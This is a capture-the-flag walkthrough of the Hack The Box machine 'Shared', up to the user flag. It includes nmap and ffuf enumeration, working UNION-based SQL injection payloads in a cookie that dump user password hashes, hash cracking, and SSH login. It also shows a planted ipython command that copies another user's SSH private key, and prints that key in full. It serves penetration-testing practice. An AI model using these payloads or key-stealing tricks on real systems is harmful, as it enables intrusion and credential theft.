# Shared

## User Flag



Drop an Nmap scan first things first.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-11 04:10 MDT
Nmap scan report for 10.10.11.172
Host is up (0.074s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-alpn: 
|   h2
|_  http/1.1
| tls-nextprotoneg: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.78 seconds
```

We can see a 22, 80, and a 443 all live. Let's check out the web service after adding to our /etc/hosts: http://shared.htb:80 

One thing of note is that it port 80 redirects us to port 443.

Looks like a virtual store, tons of potential attack vectors.

Next, I chose to enumerate over potential virtual hosts using a subdomain wordlist and came up with a few hits.

```
ffuf -H "Host: FUZZ.shared.htb" -H "User-Agent: YourMom" -c -w "SecLists/Discovery/DNS/subdomains-top1million-110000.txt" -u "https://shared.htb/" -fs 169

www                     [Status: 302, Size: 0, Words: 1, Lines: 1]
checkout                [Status: 200, Size: 3229, Words: 1509, Lines: 65]
```

Obviously the 'www' one doesn't matter as much as 'checkout'. So let's add 'checkout.shared.htb' to our /etc/hosts.

When you visit checkout.shared.htb, you're greeted inputs for credit card information. Seems like a fun place to mess with next.

Oddly enough, after putting Burp Suite on intercept mode, when I tried to put dummy values through the credit card inputs, no post request is sent at all. We're going to keep this page in the back of our pocket.

One thing of note is that at the bottom of the page is that it's managed by PrestaShop.

### PrestaShop

Let's talk about Prestashop. It seems pretty promising actually.

```
PrestaShop is a freemium, open source e-commerce platform. 
The software is published under the Open Software License.
It is written in the PHP programming language with support for the MySQL database management system.
It has a software dependency on the Symfony PHP framework.
```

Google said it for me, based in PHP and with a MySQL database. This is excellent news. This means two things:

* The site will most likely natively run PHP code, leading to RCE.
* The site could be vulnerable to SQLi and we know the database.

A couple google searches lead us to a couple promising links we could study:

* https://packetstormsecurity.com/files/157277/Prestashop-1.7.6.4-XSS-CSRF-Remote-Code-Execution.html
* http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.141886
* https://github.com/farisv/PrestaShop-CVE-2018-19126
* https://build.prestashop.com/news/major-security-vulnerability-on-prestashop-websites/

Looks like I was right about the SQLi vulnerability due to the last link, which directly discribes an SQL injection vulnerability. The PrestaShop team is even nice enough to disclose which lines *are* the vulnerability.

```
if (Configuration::get('PS_SMARTY_CACHING_TYPE') == 'mysql') {
    include _PS_CLASS_DIR_.'Smarty/SmartyCacheResourceMysql.php';
    $smarty->caching_type = 'mysql';
}
```

So, let's get to work and find a way to send in a SQL injection.

### SQLi

Now I've been poking around for a SQLi attack vector and it looks like a lot of the user inputs are duds. That being said, there is a PHPSESSID cookie and a custom_cart cookie (when you put an item in checkout) that looks kind of promising. Let's start sticking payloads in there.

So I switched to investigating the custom_cart cookie over on the checkout.shared.htb page and attempted to run some basic sqlmap scans with nothing quite turning up kosher.

So after some manual checking I've now narrowed down a payload that now makes the website return a content length of 3719 bytes rather than the regular 3345 bytes.

(The follow is inside the Burp request when visiting checkout.shared.htb.

```
Cookie: custom_cart={"yourmomfuckedyourdad' AND 1=2 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='user'-- a":"1"};
```

This payload here gets the server to return "id,username,password". Which is a great first start.

Now with this new payload that's based on the results that were returned from the previous results: I'm one step closer to my goal.

```
{"yourmomfuckedyourdad' AND 1=2 UNION SELECT 3,group_concat(id, 0x3a,username,0x3a,password),3 FROM user-- a":"3"}
```

That ends up spitting out the following:

*1:james_mason:fc895d4eddc2fc12f995e18c865cf273*

That looks like a id:username:password just like the previous SQL injection returned! That's great news! Let's shove the hash into a decrypter!!

So instead of using Hashcat or John the Ripper, I got lazy and used https://md5decrypt.net/en/ instead. We got the following results:

```
fc895d4eddc2fc12f995e18c865cf273 -> Soleil101
```

Looks like we might have just gotten our user!

The following should be our credentials:

```
james_mason:Soleil101
```

So let's go test them!!

### Securing the User Flag

Ran the following command and punched in our creds with success!

```
ssh james_mason@10.10.11.172
```

Also I'd like to point out that a pspy script is literally sitting in the machine for some reason. Anyways, let's get the user flag.

*OF COURSE IT WASN'T THIS EASY*

So the user flag is sitting is a user named dan_smith's home directory and when you try to read it you get a permission denied.

Well that sucks.

Okay so our next step is to run pspy and see what that lends us first.

So one thing I read online was to check ipython, which is running on UID=1001 and PID=4609. Because we're trying to break into dan_smith's account, this is interesting because danny boy's uid is 1001. (You can find this by checking /etc/passwd).

```
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
```

So perhaps if ipython is running on 1001, then maybe we can utilize that to our advantage.

ipython is a command shell for incorperating multiple programming languages but was originally for python, hense the name.

Okay weird thing, I was tinkering around and I honestly don't know what I did, but I can now read dan smith's private ssh key for some reason just by running cat on it. I wish I could explain but I'm not mad.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

No matter, let's get to work and secure that flag!

(This very well could have been done with the python script I put in the default ipython directory in james_mason's side that said this: "import os;os.system('cat ~/../dan_smith/.ssh/id_rsa > ~/dan_smith.key')" )

```
sudo chmod 400 dan_smith
ssh dan_smith@10.10.11.172 -i dan_smith
```

We're now signed in as Dan Smith!!

```
cat user.txt
```
